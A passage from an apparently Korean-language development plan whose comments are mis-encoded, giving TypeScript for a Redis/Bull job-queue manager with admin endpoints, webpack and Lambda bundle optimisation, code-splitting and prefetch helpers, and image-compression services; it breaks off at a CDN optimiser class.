// ì‘ì—… íƒ€ì… ì •ì˜
export enum JobType {
  AGENT_EXECUTION = 'agent_execution',
  PROJECT_BUILD = 'project_build',
  COMPONENT_GENERATION = 'component_generation',
  EMAIL_NOTIFICATION = 'email_notification',
  REPORT_GENERATION = 'report_generation',
  CACHE_WARMING = 'cache_warming',
  DATA_EXPORT = 'data_export',
  CLEANUP = 'cleanup'
}

// ì‘ì—… ìš°ì„ ìˆœìœ„
export enum JobPriority {
  CRITICAL = 1,
  HIGH = 2,
  NORMAL = 3,
  LOW = 4
}

// ì‘ì—… ë°ì´í„° ì¸í„°í˜ì´ìŠ¤
interface BaseJobData {
  type: JobType;
  userId?: string;
  projectId?: string;
  timestamp: number;
}

interface AgentExecutionJob extends BaseJobData {
  type: JobType.AGENT_EXECUTION;
  agentName: string;
  input: any;
}

interface ProjectBuildJob extends BaseJobData {
  type: JobType.PROJECT_BUILD;
  projectConfig: any;
}

export type JobData = AgentExecutionJob | ProjectBuildJob;

// í ë§¤ë‹ˆì €
export class QueueManager {
  private queues: Map<string, Queue> = new Map();
  private schedulers: Map<string, QueueScheduler> = new Map();
  private redisConnection: Redis;
  
  constructor() {
    this.redisConnection = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
      password: process.env.REDIS_PASSWORD,
      maxRetriesPerRequest: null
    });
  }
  
  // í ì´ˆê¸°í™”
  async initialize(): Promise<void> {
    // ë©”ì¸ ì‘ì—… í
    await this.createQueue('main', {
      defaultJobOptions: {
        removeOnComplete: 100,
        removeOnFail: 1000,
        attempts: 3,
        backoff: {
          type: 'exponential',
          delay: 2000
        }
      }
    });
    
    // ìš°ì„ ìˆœìœ„ í
    await this.createQueue('priority', {
      defaultJobOptions: {
        removeOnComplete: 50,
        removeOnFail: 500,
        attempts: 5
      }
    });
    
    // ë°°ì¹˜ ì‘ì—… í
    await this.createQueue('batch', {
      defaultJobOptions: {
        removeOnComplete: true,
        removeOnFail: false,
        attempts: 1
      }
    });
    
    // ìŠ¤ì¼€ì¤„ ì‘ì—… í
    await this.createQueue('scheduled', {
      defaultJobOptions: {
        removeOnComplete: true,
        attempts: 3
      }
    });
    
    logger.info('Job queues initialized');
  }
  
  // í ìƒì„±
  private async createQueue(name: string, options?: any): Promise<Queue> {
    const queue = new Bull(name, {
      redis: {
        host: process.env.REDIS_HOST || 'localhost',
        port: parseInt(process.env.REDIS_PORT || '6379'),
        password: process.env.REDIS_PASSWORD
      },
      ...options
    });
    
    // í ìŠ¤ì¼€ì¤„ëŸ¬ ìƒì„± (ì§€ì—° ì‘ì—… ì§€ì›)
    const scheduler = new QueueScheduler(name, {
      connection: this.redisConnection
    });
    
    this.queues.set(name, queue);
    this.schedulers.set(name, scheduler);
    
    // í ì´ë²¤íŠ¸ ë¦¬ìŠ¤ë„ˆ
    this.setupQueueEventListeners(queue, name);
    
    return queue;
  }
  
  // ì‘ì—… ì¶”ê°€
  async addJob(
    queueName: string,
    jobName: string,
    data: JobData,
    options?: JobOptions
  ): Promise<Job> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const jobOptions: JobOptions = {
      ...options,
      priority: this.getJobPriority(data.type)
    };
    
    const job = await queue.add(jobName, data, jobOptions);
    
    logger.info(`Job added to queue ${queueName}:`, {
      jobId: job.id,
      jobName,
      type: data.type
    });
    
    // ë©”íŠ¸ë¦­ ê¸°ë¡
    MetricsHelper.recordJobQueued(queueName, jobName);
    
    return job;
  }
  
  // ë°°ì¹˜ ì‘ì—… ì¶”ê°€
  async addBulkJobs(
    queueName: string,
    jobs: Array<{ name: string; data: JobData; opts?: JobOptions }>
  ): Promise<Job[]> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const bulkJobs = jobs.map(job => ({
      name: job.name,
      data: job.data,
      opts: {
        ...job.opts,
        priority: this.getJobPriority(job.data.type)
      }
    }));
    
    const addedJobs = await queue.addBulk(bulkJobs);
    
    logger.info(`${jobs.length} jobs added to queue ${queueName}`);
    
    // ë©”íŠ¸ë¦­ ê¸°ë¡
    MetricsHelper.recordBulkJobsQueued(queueName, jobs.length);
    
    return addedJobs;
  }
  
  // ìŠ¤ì¼€ì¤„ ì‘ì—… ì¶”ê°€
  async scheduleJob(
    queueName: string,
    jobName: string,
    data: JobData,
    cronExpression: string,
    options?: JobOptions
  ): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.add(jobName, data, {
      ...options,
      repeat: {
        cron: cronExpression,
        tz: 'UTC'
      }
    });
    
    logger.info(`Scheduled job added to queue ${queueName}:`, {
      jobName,
      cron: cronExpression
    });
  }
  
  // ì§€ì—° ì‘ì—… ì¶”ê°€
  async addDelayedJob(
    queueName: string,
    jobName: string,
    data: JobData,
    delayMs: number,
    options?: JobOptions
  ): Promise<Job> {
    return this.addJob(queueName, jobName, data, {
      ...options,
      delay: delayMs
    });
  }
  
  // ì‘ì—… ìƒíƒœ ì¡°íšŒ
  async getJobStatus(queueName: string, jobId: string): Promise<any> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const job = await queue.getJob(jobId);
    if (!job) {
      return null;
    }
    
    const state = await job.getState();
    const progress = job.progress();
    
    return {
      id: job.id,
      name: job.name,
      data: job.data,
      state,
      progress,
      attemptsMade: job.attemptsMade,
      processedOn: job.processedOn,
      finishedOn: job.finishedOn,
      failedReason: job.failedReason
    };
  }
  
  // í ìƒíƒœ ì¡°íšŒ
  async getQueueStats(queueName: string): Promise<any> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const [
      waitingCount,
      activeCount,
      completedCount,
      failedCount,
      delayedCount,
      pausedCount
    ] = await Promise.all([
      queue.getWaitingCount(),
      queue.getActiveCount(),
      queue.getCompletedCount(),
      queue.getFailedCount(),
      queue.getDelayedCount(),
      queue.isPaused()
    ]);
    
    return {
      name: queueName,
      counts: {
        waiting: waitingCount,
        active: activeCount,
        completed: completedCount,
        failed: failedCount,
        delayed: delayedCount
      },
      isPaused: pausedCount
    };
  }
  
  // í ì¼ì‹œì •ì§€/ì¬ê°œ
  async pauseQueue(queueName: string): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.pause();
    logger.info(`Queue ${queueName} paused`);
  }
  
  async resumeQueue(queueName: string): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.resume();
    logger.info(`Queue ${queueName} resumed`);
  }
  
  // í ì •ë¦¬
  async cleanQueue(queueName: string, grace: number = 5000): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.clean(grace, 'completed');
    await queue.clean(grace, 'failed');
    
    logger.info(`Queue ${queueName} cleaned`);
  }
  
  // ì‹¤íŒ¨í•œ ì‘ì—… ì¬ì‹œë„
  async retryFailedJobs(queueName: string): Promise<number> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const failedJobs = await queue.getFailed();
    let retryCount = 0;
    
    for (const job of failedJobs) {
      if (job.attemptsMade < (job.opts.attempts || 3)) {
        await job.retry();
        retryCount++;
      }
    }
    
    logger.info(`Retried ${retryCount} failed jobs in queue ${queueName}`);
    
    return retryCount;
  }
  
  // í ì´ë²¤íŠ¸ ë¦¬ìŠ¤ë„ˆ ì„¤ì •
  private setupQueueEventListeners(queue: Queue, name: string): void {
    queue.on('completed', (job, result) => {
      logger.debug(`Job completed in queue ${name}:`, {
        jobId: job.id,
        duration: Date.now() - job.timestamp
      });
      
      MetricsHelper.recordJobCompleted(name, job.name, Date.now() - job.timestamp);
    });
    
    queue.on('failed', (job, err) => {
      logger.error(`Job failed in queue ${name}:`, {
        jobId: job.id,
        error: err.message,
        attempts: job.attemptsMade
      });
      
      MetricsHelper.recordJobFailed(name, job.name);
    });
    
    queue.on('stalled', (job) => {
      logger.warn(`Job stalled in queue ${name}:`, {
        jobId: job.id
      });
    });
    
    queue.on('progress', (job, progress) => {
      logger.debug(`Job progress in queue ${name}:`, {
        jobId: job.id,
        progress
      });
    });
  }
  
  // ì‘ì—… ìš°ì„ ìˆœìœ„ ê²°ì •
  private getJobPriority(jobType: JobType): number {
    const priorityMap: Record<JobType, JobPriority> = {
      [JobType.AGENT_EXECUTION]: JobPriority.HIGH,
      [JobType.PROJECT_BUILD]: JobPriority.HIGH,
      [JobType.COMPONENT_GENERATION]: JobPriority.NORMAL,
      [JobType.EMAIL_NOTIFICATION]: JobPriority.NORMAL,
      [JobType.REPORT_GENERATION]: JobPriority.LOW,
      [JobType.CACHE_WARMING]: JobPriority.LOW,
      [JobType.DATA_EXPORT]: JobPriority.NORMAL,
      [JobType.CLEANUP]: JobPriority.LOW
    };
    
    return priorityMap[jobType] || JobPriority.NORMAL;
  }
  
  // ì¢…ë£Œ ì²˜ë¦¬
  async shutdown(): Promise<void> {
    logger.info('Shutting down job queues...');
    
    // ëª¨ë“  í ì¢…ë£Œ
    for (const [name, queue] of this.queues) {
      await queue.close();
      logger.info(`Queue ${name} closed`);
    }
    
    // ìŠ¤ì¼€ì¤„ëŸ¬ ì¢…ë£Œ
    for (const [name, scheduler] of this.schedulers) {
      await scheduler.close();
      logger.info(`Scheduler ${name} closed`);
    }
    
    // Redis ì—°ê²° ì¢…ë£Œ
    await this.redisConnection.quit();
    
    logger.info('Job queues shutdown complete');
  }
}

// Job Worker ë² ì´ìŠ¤ í´ë˜ìŠ¤
export abstract class JobWorker {
  protected queue: Queue;
  protected concurrency: number;
  
  constructor(queue: Queue, concurrency: number = 1) {
    this.queue = queue;
    this.concurrency = concurrency;
  }
  
  // ì›Œì»¤ ì‹œì‘
  async start(): Promise<void> {
    this.queue.process(this.concurrency, async (job: Job) => {
      const startTime = Date.now();
      
      try {
        logger.info(`Processing job ${job.id} of type ${job.name}`);
        
        // ì§„í–‰ë¥  ì—…ë°ì´íŠ¸
        await job.progress(0);
        
        // ì‹¤ì œ ì‘ì—… ì²˜ë¦¬
        const result = await this.process(job);
        
        // ì™„ë£Œ ì§„í–‰ë¥ 
        await job.progress(100);
        
        const duration = Date.now() - startTime;
        logger.info(`Job ${job.id} completed in ${duration}ms`);
        
        return result;
        
      } catch (error) {
        logger.error(`Job ${job.id} failed:`, error);
        throw error;
      }
    });
  }
  
  // ì¶”ìƒ ë©”ì„œë“œ: ì‹¤ì œ ì‘ì—… ì²˜ë¦¬
  abstract process(job: Job): Promise<any>;
}

// ì—ì´ì „íŠ¸ ì‹¤í–‰ ì›Œì»¤ ì˜ˆì‹œ
export class AgentExecutionWorker extends JobWorker {
  async process(job: Job<AgentExecutionJob>): Promise<any> {
    const { agentName, input } = job.data;
    
    // ì§„í–‰ë¥  ì—…ë°ì´íŠ¸
    await job.progress(10);
    
    // ì—ì´ì „íŠ¸ ì´ˆê¸°í™”
    const agent = await this.initializeAgent(agentName);
    await job.progress(30);
    
    // ì—ì´ì „íŠ¸ ì‹¤í–‰
    const result = await agent.execute(input);
    await job.progress(90);
    
    // ê²°ê³¼ ì €ì¥
    await this.saveResult(job.data.projectId!, result);
    
    return result;
  }
  
  private async initializeAgent(agentName: string): Promise<any> {
    // ì—ì´ì „íŠ¸ ì´ˆê¸°í™” ë¡œì§
    return {};
  }
  
  private async saveResult(projectId: string, result: any): Promise<void> {
    // ê²°ê³¼ ì €ì¥ ë¡œì§
  }
}

// í ê´€ë¦¬ API ì—”ë“œí¬ì¸íŠ¸
export function setupQueueManagementEndpoints(app: Express, queueManager: QueueManager): void {
  // í ìƒíƒœ ì¡°íšŒ
  app.get('/api/admin/queues/:name/stats', async (req, res) => {
    try {
      const stats = await queueManager.getQueueStats(req.params.name);
      res.json(stats);
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // ì‘ì—… ìƒíƒœ ì¡°íšŒ
  app.get('/api/admin/queues/:name/jobs/:id', async (req, res) => {
    try {
      const status = await queueManager.getJobStatus(req.params.name, req.params.id);
      res.json(status);
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // í ì¼ì‹œì •ì§€
  app.post('/api/admin/queues/:name/pause', async (req, res) => {
    try {
      await queueManager.pauseQueue(req.params.name);
      res.json({ success: true });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // í ì¬ê°œ
  app.post('/api/admin/queues/:name/resume', async (req, res) => {
    try {
      await queueManager.resumeQueue(req.params.name);
      res.json({ success: true });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // ì‹¤íŒ¨í•œ ì‘ì—… ì¬ì‹œë„
  app.post('/api/admin/queues/:name/retry-failed', async (req, res) => {
    try {
      const count = await queueManager.retryFailedJobs(req.params.name);
      res.json({ retriedJobs: count });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
}
```
---

### SubTask 0.11.4: ì½”ë“œ ìŠ¤í”Œë¦¬íŒ… ë° ë²ˆë“¤ ìµœì í™”
**ëª©í‘œ**: í”„ë¡ íŠ¸ì—”ë“œ ë° ë°±ì—”ë“œ ì½”ë“œ ë²ˆë“¤ ìµœì í™”

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/performance/bundle-optimizer.ts
import webpack from 'webpack';
import TerserPlugin from 'terser-webpack-plugin';
import CompressionPlugin from 'compression-webpack-plugin';
import { BundleAnalyzerPlugin } from 'webpack-bundle-analyzer';
import nodeExternals from 'webpack-node-externals';

// ë°±ì—”ë“œ ë²ˆë“¤ ìµœì í™” ì„¤ì •
export const backendWebpackConfig: webpack.Configuration = {
  mode: process.env.NODE_ENV === 'production' ? 'production' : 'development',
  target: 'node',
  entry: {
    main: './src/main.ts',
    // ì—ì´ì „íŠ¸ë³„ ì—”íŠ¸ë¦¬ í¬ì¸íŠ¸
    'agents/nl-input': './src/agents/nl-input-agent.ts',
    'agents/ui-selection': './src/agents/ui-selection-agent.ts',
    'agents/parsing': './src/agents/parsing-agent.ts',
    'agents/component-decision': './src/agents/component-decision-agent.ts',
    'agents/matching-rate': './src/agents/matching-rate-agent.ts',
    'agents/search': './src/agents/search-agent.ts',
    'agents/generation': './src/agents/generation-agent.ts',
    'agents/assembly': './src/agents/assembly-agent.ts',
    'agents/download': './src/agents/download-agent.ts'
  },
  output: {
    path: path.resolve(__dirname, '../../dist'),
    filename: '[name].js',
    libraryTarget: 'commonjs2'
  },
  externals: [nodeExternals()],
  module: {
    rules: [
      {
        test: /\.ts$/,
        use: 'ts-loader',
        exclude: /node_modules/
      }
    ]
  },
  resolve: {
    extensions: ['.ts', '.js'],
    alias: {
      '@': path.resolve(__dirname, '../src')
    }
  },
  optimization: {
    minimize: process.env.NODE_ENV === 'production',
    minimizer: [
      new TerserPlugin({
        terserOptions: {
          keep_classnames: true,
          keep_fnames: true
        }
      })
    ],
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        commons: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          chunks: 'initial'
        },
        shared: {
          test: /[\\/]src[\\/]shared[\\/]/,
          name: 'shared',
          chunks: 'all',
          minSize: 0
        }
      }
    }
  },
  plugins: [
    new webpack.DefinePlugin({
      'process.env.NODE_ENV': JSON.stringify(process.env.NODE_ENV)
    }),
    new CompressionPlugin({
      algorithm: 'gzip',
      test: /\.(js|ts)$/,
      threshold: 10240,
      minRatio: 0.8
    }),
    ...(process.env.ANALYZE === 'true' ? [
      new BundleAnalyzerPlugin({
        analyzerMode: 'static',
        reportFilename: 'bundle-report.html'
      })
    ] : [])
  ]
};

// Lambda í•¨ìˆ˜ ìµœì í™” ì„¤ì •
export class LambdaOptimizer {
  private functionConfigs: Map<string, webpack.Configuration> = new Map();
  
  // Lambda í•¨ìˆ˜ë³„ ìµœì í™” ì„¤ì • ìƒì„±
  createLambdaConfig(functionName: string, entryPoint: string): webpack.Configuration {
    return {
      mode: 'production',
      target: 'node18',
      entry: entryPoint,
      output: {
        path: path.resolve(__dirname, `../../dist/lambda/${functionName}`),
        filename: 'index.js',
        libraryTarget: 'commonjs2'
      },
      externals: [
        // AWS SDKëŠ” Lambda ëŸ°íƒ€ì„ì— í¬í•¨ë˜ì–´ ìˆìŒ
        /^@aws-sdk/,
        // ë¬´ê±°ìš´ ì˜ì¡´ì„±ì€ Layerë¡œ ë¶„ë¦¬
        'sharp',
        'puppeteer',
        'canvas'
      ],
      optimization: {
        minimize: true,
        minimizer: [
          new TerserPlugin({
            terserOptions: {
              compress: {
                drop_console: true,
                drop_debugger: true,
                pure_funcs: ['console.log', 'console.info']
              },
              mangle: {
                reserved: ['handler', 'exports']
              },
              output: {
                comments: false
              }
            }
          })
        ],
        // Tree shaking ìµœì í™”
        usedExports: true,
        sideEffects: false
      },
      resolve: {
        extensions: ['.ts', '.js']
      },
      module: {
        rules: [
          {
            test: /\.ts$/,
            use: [
              {
                loader: 'ts-loader',
                options: {
                  transpileOnly: true,
                  compilerOptions: {
                    target: 'ES2022'
                  }
                }
              }
            ]
          }
        ]
      },
      plugins: [
        // ë²ˆë“¤ í¬ê¸° ì œí•œ (Lambda ì œí•œ: 50MB zipped)
        new webpack.optimize.LimitChunkCountPlugin({
          maxChunks: 1
        }),
        // í™˜ê²½ ë³€ìˆ˜ ì£¼ì…
        new webpack.EnvironmentPlugin({
          NODE_ENV: 'production',
          AWS_REGION: 'us-east-1'
        })
      ]
    };
  }
  
  // ëª¨ë“  Lambda í•¨ìˆ˜ ë¹Œë“œ
  async buildAllFunctions(): Promise<void> {
    const functions = [
      { name: 'nl-processor', entry: './src/lambda/nl-processor.ts' },
      { name: 'code-generator', entry: './src/lambda/code-generator.ts' },
      { name: 'component-searcher', entry: './src/lambda/component-searcher.ts' }
    ];
    
    for (const func of functions) {
      const config = this.createLambdaConfig(func.name, func.entry);
      await this.buildFunction(config);
      
      // ë²ˆë“¤ í¬ê¸° ê²€ì¦
      await this.validateBundleSize(func.name);
    }
  }
  
  private async buildFunction(config: webpack.Configuration): Promise<void> {
    return new Promise((resolve, reject) => {
      webpack(config, (err, stats) => {
        if (err || stats?.hasErrors()) {
          reject(err || new Error('Build failed'));
          return;
        }
        
        console.log(stats?.toString({
          colors: true,
          modules: false,
          children: false
        }));
        
        resolve();
      });
    });
  }
  
  private async validateBundleSize(functionName: string): Promise<void> {
    const bundlePath = path.resolve(__dirname, `../../dist/lambda/${functionName}/index.js`);
    const stats = await fs.stat(bundlePath);
    const sizeInMB = stats.size / (1024 * 1024);
    
    if (sizeInMB > 45) {
      throw new Error(`Lambda function ${functionName} bundle size (${sizeInMB.toFixed(2)}MB) exceeds safe limit`);
    }
    
    console.log(`âœ… ${functionName} bundle size: ${sizeInMB.toFixed(2)}MB`);
  }
}

// ë™ì  ì„í¬íŠ¸ í—¬í¼
export class DynamicImportManager {
  private loadedModules: Map<string, any> = new Map();
  
  // ì—ì´ì „íŠ¸ ë™ì  ë¡œë”©
  async loadAgent(agentName: string): Promise<any> {
    const cached = this.loadedModules.get(agentName);
    if (cached) {
      return cached;
    }
    
    try {
      const module = await import(
        /* webpackChunkName: "[request]" */
        `../agents/${agentName}-agent`
      );
      
      this.loadedModules.set(agentName, module.default);
      return module.default;
      
    } catch (error) {
      logger.error(`Failed to load agent ${agentName}:`, error);
      throw error;
    }
  }
  
  // í”„ë¦¬ë¡œë“œ íŒíŠ¸ ìƒì„±
  generatePreloadHints(requiredAgents: string[]): string[] {
    return requiredAgents.map(agent => 
      `<link rel="preload" href="/agents/${agent}.js" as="script">`
    );
  }
  
  // ëª¨ë“ˆ ì–¸ë¡œë“œ
  unloadModule(moduleName: string): void {
    this.loadedModules.delete(moduleName);
    
    // ë©”ëª¨ë¦¬ì—ì„œ require ìºì‹œ ì œê±°
    const resolvedPath = require.resolve(`../agents/${moduleName}-agent`);
    delete require.cache[resolvedPath];
  }
}

// í”„ë¡ íŠ¸ì—”ë“œ ì½”ë“œ ìŠ¤í”Œë¦¬íŒ… ì„¤ì •
export const frontendViteConfig = {
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          // ë²¤ë” ì²­í¬
          'vendor-react': ['react', 'react-dom', 'react-router-dom'],
          'vendor-ui': ['@mui/material', '@emotion/react', '@emotion/styled'],
          'vendor-utils': ['axios', 'lodash', 'date-fns'],
          'vendor-charts': ['recharts', 'd3'],
          
          // ê¸°ëŠ¥ë³„ ì²­í¬
          'feature-editor': ['monaco-editor', '@monaco-editor/react'],
          'feature-analytics': ['./src/features/analytics/index.ts'],
          'feature-auth': ['./src/features/auth/index.ts']
        },
        // ì²­í¬ íŒŒì¼ëª… í˜•ì‹
        chunkFileNames: (chunkInfo) => {
          const facadeModuleId = chunkInfo.facadeModuleId ? 
            path.basename(chunkInfo.facadeModuleId, path.extname(chunkInfo.facadeModuleId)) : 
            'chunk';
          return `${facadeModuleId}.[hash].js`;
        }
      }
    },
    // ì••ì¶• ì„¤ì •
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: process.env.NODE_ENV === 'production',
        drop_debugger: true,
        pure_funcs: ['console.log', 'console.debug'],
        passes: 2
      }
    },
    // ì²­í¬ í¬ê¸° ê²½ê³ 
    chunkSizeWarningLimit: 500,
    // CSS ì½”ë“œ ìŠ¤í”Œë¦¬íŒ…
    cssCodeSplit: true,
    // ì†ŒìŠ¤ë§µ ì„¤ì •
    sourcemap: process.env.NODE_ENV !== 'production'
  },
  optimizeDeps: {
    include: ['react', 'react-dom'],
    exclude: ['@aws-sdk']
  }
};

// ëŸ°íƒ€ì„ ì½”ë“œ ìŠ¤í”Œë¦¬íŒ… ì»´í¬ë„ŒíŠ¸
export const LazyComponent = (importFunc: () => Promise<any>) => {
  return React.lazy(async () => {
    const startTime = performance.now();
    
    try {
      const module = await importFunc();
      const loadTime = performance.now() - startTime;
      
      // ë¡œë”© ì„±ëŠ¥ ë©”íŠ¸ë¦­
      if (window.performance && window.performance.measure) {
        window.performance.measure('component-load', {
          start: startTime,
          duration: loadTime
        });
      }
      
      return module;
    } catch (error) {
      console.error('Failed to load component:', error);
      
      // í´ë°± ì»´í¬ë„ŒíŠ¸ ë°˜í™˜
      return {
        default: () => <div>Failed to load component</div>
      };
    }
  });
};

// í”„ë¦¬í˜ì¹˜ ë§¤ë‹ˆì €
export class PrefetchManager {
  private prefetchQueue: Set<string> = new Set();
  private observer: IntersectionObserver;
  
  constructor() {
    // Intersection Observerë¡œ ë·°í¬íŠ¸ ì§„ì… ê°ì§€
    this.observer = new IntersectionObserver(
      (entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            const component = entry.target.getAttribute('data-prefetch');
            if (component) {
              this.prefetchComponent(component);
            }
          }
        });
      },
      { rootMargin: '50px' }
    );
  }
  
  // ì»´í¬ë„ŒíŠ¸ í”„ë¦¬í˜ì¹˜
  async prefetchComponent(componentPath: string): Promise<void> {
    if (this.prefetchQueue.has(componentPath)) {
      return;
    }
    
    this.prefetchQueue.add(componentPath);
    
    try {
      // ë„¤íŠ¸ì›Œí¬ê°€ idle ìƒíƒœì¼ ë•Œ í”„ë¦¬í˜ì¹˜
      if ('requestIdleCallback' in window) {
        requestIdleCallback(() => {
          import(componentPath);
        });
      } else {
        // í´ë°±: setTimeout ì‚¬ìš©
        setTimeout(() => {
          import(componentPath);
        }, 1);
      }
    } catch (error) {
      console.error(`Failed to prefetch ${componentPath}:`, error);
    }
  }
  
  // ë¼ìš°íŠ¸ ê¸°ë°˜ í”„ë¦¬í˜ì¹˜
  prefetchRoute(route: string): void {
    const routeComponents: Record<string, string[]> = {
      '/dashboard': [
        './features/dashboard/index',
        './features/analytics/index'
      ],
      '/projects': [
        './features/projects/index',
        './features/editor/index'
      ],
      '/components': [
        './features/components/index',
        './features/search/index'
      ]
    };
    
    const components = routeComponents[route] || [];
    components.forEach(comp => this.prefetchComponent(comp));
  }
  
  // ì—˜ë¦¬ë¨¼íŠ¸ ê´€ì°° ì‹œì‘
  observe(element: HTMLElement): void {
    this.observer.observe(element);
  }
  
  // ì •ë¦¬
  disconnect(): void {
    this.observer.disconnect();
    this.prefetchQueue.clear();
  }
}
```

### SubTask 0.11.5: ë¦¬ì†ŒìŠ¤ ìµœì í™” ë° ì••ì¶•
**ëª©í‘œ**: ì •ì  ë¦¬ì†ŒìŠ¤ ìµœì í™” ë° ì••ì¶• ì „ëµ

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/performance/resource-optimizer.ts
import sharp from 'sharp';
import imagemin from 'imagemin';
import imageminPngquant from 'imagemin-pngquant';
import imageminMozjpeg from 'imagemin-mozjpeg';
import imageminSvgo from 'imagemin-svgo';
import { createReadStream, createWriteStream } from 'fs';
import { pipeline } from 'stream/promises';
import zlib from 'zlib';
import crypto from 'crypto';

// ì´ë¯¸ì§€ ìµœì í™” ì„œë¹„ìŠ¤
export class ImageOptimizationService {
  private readonly cachePath = './cache/images';
  private readonly supportedFormats = ['jpeg', 'jpg', 'png', 'webp', 'avif'];
  
  // ì´ë¯¸ì§€ ìµœì í™”
  async optimizeImage(
    inputPath: string,
    outputPath: string,
    options: {
      width?: number;
      height?: number;
      quality?: number;
      format?: string;
    } = {}
  ): Promise<void> {
    const { width, height, quality = 85, format } = options;
    
    // Sharpë¥¼ ì‚¬ìš©í•œ ì´ë¯¸ì§€ ì²˜ë¦¬
    let sharpInstance = sharp(inputPath);
    
    // ë¦¬ì‚¬ì´ì§•
    if (width || height) {
      sharpInstance = sharpInstance.resize(width, height, {
        fit: 'inside',
        withoutEnlargement: true
      });
    }
    
    // í¬ë§· ë³€í™˜
    if (format && this.supportedFormats.includes(format)) {
      sharpInstance = sharpInstance.toFormat(format as any, { quality });
    }
    
    // ë©”íƒ€ë°ì´í„° ì œê±°
    sharpInstance = sharpInstance.withMetadata({
      exif: false,
      icc: false,
      iptc: false,
      xmp: false
    });
    
    await sharpInstance.toFile(outputPath);
    
    // ì¶”ê°€ ìµœì í™”
    await this.furtherOptimize(outputPath, format || 'jpeg');
  }
  
  // ì¶”ê°€ ìµœì í™” (imagemin ì‚¬ìš©)
  private async furtherOptimize(filePath: string, format: string): Promise<void> {
    const plugins = [];
    
    switch (format) {
      case 'jpeg':
      case 'jpg':
        plugins.push(imageminMozjpeg({ quality: 85 }));
        break;
      case 'png':
        plugins.push(imageminPngquant({ quality: [0.6, 0.8] }));
        break;
      case 'svg':
        plugins.push(imageminSvgo());
        break;
    }
    
    if (plugins.length > 0) {
      await imagemin([filePath], {
        destination: path.dirname(filePath),
        plugins
      });
    }
  }
  
  // ë°˜ì‘í˜• ì´ë¯¸ì§€ ìƒì„±
  async generateResponsiveImages(
    inputPath: string,
    outputDir: string,
    breakpoints: number[] = [320, 640, 960, 1280, 1920]
  ): Promise<Record<string, string>> {
    const results: Record<string, string> = {};
    const format = 'webp'; // í˜„ëŒ€ì ì¸ í¬ë§· ì‚¬ìš©
    
    for (const width of breakpoints) {
      const outputName = `image-${width}w.${format}`;
      const outputPath = path.join(outputDir, outputName);
      
      await this.optimizeImage(inputPath, outputPath, {
        width,
        format,
        quality: this.getQualityForWidth(width)
      });
      
      results[`${width}w`] = outputPath;
    }
    
    // ì›ë³¸ë„ ìµœì í™”
    const originalName = `image-original.${format}`;
    const originalPath = path.join(outputDir, originalName);
    await this.optimizeImage(inputPath, originalPath, { format });
    results['original'] = originalPath;
    
    return results;
  }
  
  // ë„ˆë¹„ì— ë”°ë¥¸ í’ˆì§ˆ ê²°ì •
  private getQualityForWidth(width: number): number {
    if (width <= 640) return 70;
    if (width <= 1280) return 80;
    return 85;
  }
  
  // ì´ë¯¸ì§€ ìºì‹± í‚¤ ìƒì„±
  generateCacheKey(options: any): string {
    const hash = crypto
      .createHash('md5')
      .update(JSON.stringify(options))
      .digest('hex');
    return hash;
  }
}

// íŒŒì¼ ì••ì¶• ì„œë¹„ìŠ¤
export class CompressionService {
  // Gzip ì••ì¶•
  async gzipFile(inputPath: string, outputPath: string): Promise<void> {
    const gzip = zlib.createGzip({ level: 9 });
    await pipeline(
      createReadStream(inputPath),
      gzip,
      createWriteStream(outputPath)
    );
  }
  
  // Brotli ì••ì¶•
  async brotliFile(inputPath: string, outputPath: string): Promise<void> {
    const brotli = zlib.createBrotliCompress({
      params: {
        [zlib.constants.BROTLI_PARAM_QUALITY]: 11
      }
    });
    await pipeline(
      createReadStream(inputPath),
      brotli,
      createWriteStream(outputPath)
    );
  }
  
  // ìë™ ì••ì¶• ê²°ì •
  async compressFile(
    inputPath: string,
    outputDir: string,
    acceptEncoding: string = ''
  ): Promise<string> {
    const filename = path.basename(inputPath);
    const stats = await fs.stat(inputPath);
    
    // ì‘ì€ íŒŒì¼ì€ ì••ì¶•í•˜ì§€ ì•ŠìŒ
    if (stats.size < 1024) {
      return inputPath;
    }
    
    // Brotli ì§€ì› í™•ì¸
    if (acceptEncoding.includes('br')) {
      const brotliPath = path.join(outputDir, `${filename}.br`);
      await this.brotliFile(inputPath, brotliPath);
      
      const brotliStats = await fs.stat(brotliPath);
      if (brotliStats.size < stats.size * 0.9) {
        return brotliPath;
      }
    }
    
    // Gzip ì••ì¶•
    if (acceptEncoding.includes('gzip')) {
      const gzipPath = path.join(outputDir, `${filename}.gz`);
      await this.gzipFile(inputPath, gzipPath);
      
      const gzipStats = await fs.stat(gzipPath);
      if (gzipStats.size < stats.size * 0.9) {
        return gzipPath;
      }
    }
    
    return inputPath;
  }
}

// CDN ìµœì í™” í—¤ë”
export class CDNOptimizer {
